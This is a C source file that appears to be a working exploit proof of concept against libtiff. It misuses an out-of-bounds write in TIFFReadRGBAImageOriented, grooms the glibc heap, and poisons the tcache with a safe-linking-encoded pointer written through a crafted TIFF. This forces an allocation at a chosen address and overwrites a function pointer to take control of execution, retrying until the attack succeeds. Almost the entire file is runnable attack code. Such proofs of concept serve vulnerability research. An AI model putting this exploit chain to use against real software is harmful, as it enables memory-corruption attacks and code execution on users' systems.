#include <tiffio.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <assert.h>
#include <stdbool.h>

typedef void (*fn_cb)(void *);
typedef struct VictimObj {
    fn_cb cb;
    char  msg[128];
} VictimObj;

static void benign_cb(void *p) {
    VictimObj *obj = (VictimObj *)p;
    fprintf(stderr, "[benign_cb] %s\n", obj ? obj->msg : "(null)");
}

static void pwned_cb(void *p) {
    VictimObj *obj = (VictimObj *)p;
    fprintf(stderr, "[pwned_cb] RIP control achieved; msg='%s'\n",
            obj ? obj->msg : "(null)");
}

static void dump_bytes(const void* p, size_t n) {
    const unsigned char* b = (const unsigned char*)p;
    for (size_t i = 0; i < n; i++) {
        if ((i % 16) == 0) fprintf(stderr, "\n  +%04zx: ", i);
        fprintf(stderr, "%02x ", b[i]);
    }
    fprintf(stderr, "\n");
}

// Write a tiny 4x4 RGBA TIFF where row 1, columns 0..3 encode the
// 4 uint32_t values provided in little-endian via RGBA bytes.
static int write_small_tiff_rgba(const char* path, const uint32_t row1_words[4]) {
    TIFF* tif = TIFFOpen(path, "w");
    if (!tif) { fprintf(stderr, "Failed to create %s\n", path); return 0; }

    const uint32_t width = 4;
    const uint32_t height = 4;
    const uint16_t spp = 4;  // RGBA
    const uint16_t bps = 8;

    TIFFSetField(tif, TIFFTAG_IMAGEWIDTH, width);
    TIFFSetField(tif, TIFFTAG_IMAGELENGTH, height);
    TIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL, spp);
    TIFFSetField(tif, TIFFTAG_BITSPERSAMPLE, bps);
    TIFFSetField(tif, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_RGB);
    TIFFSetField(tif, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG);
    TIFFSetField(tif, TIFFTAG_ROWSPERSTRIP, 1);
    TIFFSetField(tif, TIFFTAG_COMPRESSION, COMPRESSION_NONE);
    // Explicit alpha so TIFFRGBA path uses PACK4 and preserves our 4 bytes
    uint16 extrasamples = EXTRASAMPLE_ASSOCALPHA;
    TIFFSetField(tif, TIFFTAG_EXTRASAMPLES, 1, &extrasamples);

    uint8_t buf[width * spp];
    for (uint32_t y = 0; y < height; y++) {
        for (uint32_t x = 0; x < width; x++) {
            uint8_t* p = &buf[x * spp];
            if (y == 1 && x < 4) {
                uint32_t v = row1_words[x];
                p[0] = (uint8_t)(v & 0xFF);         // R (LSB)
                p[1] = (uint8_t)((v >> 8) & 0xFF);  // G
                p[2] = (uint8_t)((v >> 16) & 0xFF); // B
                p[3] = (uint8_t)((v >> 24) & 0xFF); // A (MSB)
            } else {
                // Filler pattern (opaque grey gradient)
                p[0] = (uint8_t)(16 + x + y * 3);
                p[1] = (uint8_t)(16 + x + y * 3);
                p[2] = (uint8_t)(16 + x + y * 3);
                p[3] = 0xFF;
            }
        }
        if (TIFFWriteScanline(tif, buf, y, 0) < 0) {
            fprintf(stderr, "WriteScanline failed at y=%u\n", y);
            TIFFClose(tif);
            return 0;
        }
    }

    TIFFClose(tif);
    return 1;
}

static void usage(const char* prog) {
    fprintf(stderr,
            "Usage: %s [options] [tiff_path]\n"
            "\n"
            "Options:\n"
            "  --attempts N, -A N    Number of retry attempts (default: 20)\n"
            "  --size N, -S N        Allocation size (bytes) for victim/target.\n"
            "                        Default: align(sizeof(VictimObj))\n"
            "  --help, -h            Show this help message\n"
            "\n"
            "Description:\n"
            "  Exploits the TIFFReadRGBAImageOriented raster OOB to poison glibc tcache,\n"
            "  force an allocation at a chosen target, and overwrite a function pointer\n"
            "  to demonstrate RIP control.\n"
            "\n"
            "Notes:\n"
            "  - OOB window per row is 16 bytes (width=4).\n"
            "  - Retry logic handles heap placement variance and tcache noise.\n"
            , prog);
}

typedef struct {
    int attempts;
    size_t req_size; // 0 = auto align to sizeof(VictimObj)
} Config;

static size_t align16(size_t x) { return (x + 0xF) & ~((size_t)0xF); }

int main(int argc, char** argv) {
    Config cfg = { .attempts = 20, .req_size = 0 };
    const char* path = "input_small.tif";

    // Parse CLI options
    for (int i = 1; i < argc; i++) {
        const char* a = argv[i];
        if (strcmp(a, "--help") == 0 || strcmp(a, "-h") == 0) {
            usage(argv[0]);
            return 0;
        } else if ((strcmp(a, "--attempts") == 0 || strcmp(a, "-A") == 0) && i + 1 < argc) {
            cfg.attempts = atoi(argv[++i]);
            if (cfg.attempts < 1) cfg.attempts = 1;
        } else if ((strcmp(a, "--size") == 0 || strcmp(a, "-S") == 0) && i + 1 < argc) {
            cfg.req_size = (size_t)strtoull(argv[++i], NULL, 0);
        } else if (a[0] == '-') {
            fprintf(stderr, "Unknown option: %s\n", a);
            usage(argv[0]);
            return 1;
        } else {
            path = a;
        }
    }

    if (cfg.req_size == 0) {
        cfg.req_size = align16(sizeof(VictimObj));
    }

    bool success = false;
    for (int attempt = 1; attempt <= cfg.attempts && !success; attempt++) {
        fprintf(stderr, "[attempt %d/%d]\n", attempt, cfg.attempts);

        // Deliberately undersized raster: only 4x2 = 8 pixels allocated
        const uint32_t rheight = 2;                 // read 2 rows
        const uint32_t small_w = 4;
        const size_t small_alloc_pixels = (size_t)small_w * rheight; // 8 pixels
        uint32_t* raster = (uint32_t*)calloc(small_alloc_pixels, sizeof(uint32_t));
        if (!raster) { fprintf(stderr, "calloc failed\n"); return 1; }

        // Allocate a victim chunk after raster and free it to tcache
        size_t req_size = cfg.req_size;
        void* victim = malloc(req_size);
        if (!victim) { fprintf(stderr, "malloc victim failed\n"); free(raster); return 1; }

        // Try to steer victim after raster by allocating throwaway chunks (freed at end)
        void* steer[128]; int steer_n = 0;
        while (victim <= (void*)raster && steer_n < (int)(sizeof(steer)/sizeof(steer[0]))) {
            void* tmp = malloc(req_size);
            if (!tmp) break;
            steer[steer_n++] = victim;
            victim = tmp;
        }

        printf("raster=%p (size=%zub), victim=%p\n", (void*)raster,
               small_alloc_pixels * sizeof(uint32_t), victim);
        ptrdiff_t delta = (unsigned char*)victim - (unsigned char*)raster;
        if (delta <= 0 || (delta % 4) != 0) {
            fprintf(stderr, "  skip: victim not suitably placed after raster (delta=%td)\n", delta);
            // cleanup and retry
            for (int i = 0; i < steer_n; i++) free(steer[i]);
            free(victim);
            free(raster);
            continue;
        }

        uint64_t w64 = (uint64_t)delta / 4u; // elements to reach victim
        if (w64 > UINT32_MAX) {
            fprintf(stderr, "  skip: computed rwidth too large: %" PRIu64 "\n", w64);
            for (int i = 0; i < steer_n; i++) free(steer[i]);
            free(victim);
            free(raster);
            continue;
        }
        uint32_t rwidth = (uint32_t)w64;
        printf("Computed rwidth=%" PRIu32 " so row1 starts at victim (delta=%td bytes)\n",
               rwidth, delta);

        // Prepare a Victim object we aim to overlap/control via tcache poisoning
        VictimObj *obj = (VictimObj *)malloc(req_size);
        if (!obj) {
            fprintf(stderr, "malloc target (VictimObj) failed\n");
            for (int i = 0; i < steer_n; i++) free(steer[i]);
            free(victim);
            free(raster);
            return 1;
        }
        obj->cb = benign_cb;
        snprintf(obj->msg, sizeof(obj->msg), "hello from victim");
        void *target = (void *)obj;
        fprintf(stderr, "VictimObj at %p, cb=%p\n", (void*)obj, (void*)obj->cb);

        // Free victim so it becomes a tcache entry; its first 8 bytes now hold encoded fd
        free(victim);

        // Compute safe-linked fd encoding for tcache: stored_fd = target ^ ((victim_addr) >> 12)
        uintptr_t victim_addr = (uintptr_t)victim;
        uintptr_t target_addr = (uintptr_t)target;
        uint64_t encoded_fd = (uint64_t)(target_addr ^ (victim_addr >> 12));

        // Build row words to write into freed victim: first 8 bytes = encoded_fd
        uint32_t row1_words[4];
        row1_words[0] = (uint32_t)(encoded_fd & 0xffffffffu);
        row1_words[1] = (uint32_t)((encoded_fd >> 32) & 0xffffffffu);
        row1_words[2] = 0x44444444u;
        row1_words[3] = 0x45454545u;

        // Write the TIFF now that we know the bytes to spray
        if (!write_small_tiff_rgba(path, row1_words)) {
            fprintf(stderr, "  skip: failed to write input TIFF\n");
            for (int i = 0; i < steer_n; i++) free(steer[i]);
            free(raster);
            free(obj);
            continue;
        }

        // Open the TIFF and trigger the OOB write into freed victim
        TIFF* tif = TIFFOpen(path, "r");
        if (!tif) {
            fprintf(stderr, "  skip: failed to open %s for reading\n", path);
            for (int i = 0; i < steer_n; i++) free(steer[i]);
            free(raster);
            free(obj);
            continue;
        }

        // Optional: peek at victim bytes pre/post
        fprintf(stderr, "Victim bytes before overwrite:");
        dump_bytes(victim, 16);

        int ok = TIFFReadRGBAImageOriented(tif, rwidth, rheight, raster, ORIENTATION_TOPLEFT, 0);
        printf("TIFFReadRGBAImageOriented returned %d\n", ok);

        fprintf(stderr, "Victim bytes after overwrite:");
        dump_bytes(victim, 16);

        // Now allocate twice from same size to pop victim then land on target
        void* p1 = malloc(req_size); // returns victim
        void* p2 = malloc(req_size); // returns target (if poison successful)
        printf("p1=%p (expect victim), p2=%p (expect target=%p)\n", p1, p2, target);

        if (p2 == target) {
            // Overwrite function pointer in the overlapped object
            ((VictimObj *)p2)->cb = pwned_cb;
            fprintf(stderr, "Overwrote VictimObj->cb to %p\n", (void*)pwned_cb);
            fprintf(stderr, "Invoking obj->cb(obj) ...\n");
            obj->cb(obj);
            success = true;
        } else {
            fprintf(stderr, "  retry: poisoning failed (p2 != target).\n");
        }

        TIFFClose(tif);
        free(p1);
        if (p2 && p2 != target) free(p2);
        if (obj) free(obj);
        for (int i = 0; i < steer_n; i++) free(steer[i]);
        free(raster);
    }

    return success ? 0 : 2;
}
